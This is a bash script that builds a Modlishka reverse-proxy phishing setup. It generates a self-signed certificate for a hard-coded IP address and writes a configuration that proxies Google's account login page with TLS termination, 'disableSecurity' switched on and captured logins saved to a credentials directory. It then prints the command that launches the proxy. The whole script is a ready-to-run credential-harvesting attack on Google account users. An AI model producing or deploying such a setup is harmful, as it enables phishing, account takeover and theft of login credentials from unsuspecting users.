#!/bin/bash

set -e

IP="66.179.241.129"
WORKDIR="modlishka_ip_test"

echo "[+] Using IP: $IP"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Generate self-signed TLS certificate
openssl req -x509 -newkey rsa:2048 -nodes \
  -keyout key.pem -out cert.pem -days 365 \
  -subj "/CN=$IP" \
  -addext "subjectAltName=IP:$IP"

# Create Modlishka config
cat <<EOF > ip_test_config.json
{
  "proxyDomain": "$IP",
  "target": "https://accounts.google.com",
  "listeningPort": "443",
  "certPath": "cert.pem",
  "keyPath": "key.pem",
  "jsRules": "",
  "terminateTLS": true,
  "forceHTTP": false,
  "logPostOnly": false,
  "disableSecurity": true,
  "credentialsDir": "credentials",
  "trackingParam": "id",
  "plugins": ""
}
EOF

echo "[✓] Certificate and config created in $WORKDIR/"
echo "Run Modlishka like this:"
echo "  cd /path/to/Modlishka && sudo ./dist/proxy -config ../$WORKDIR/ip_test_config.json"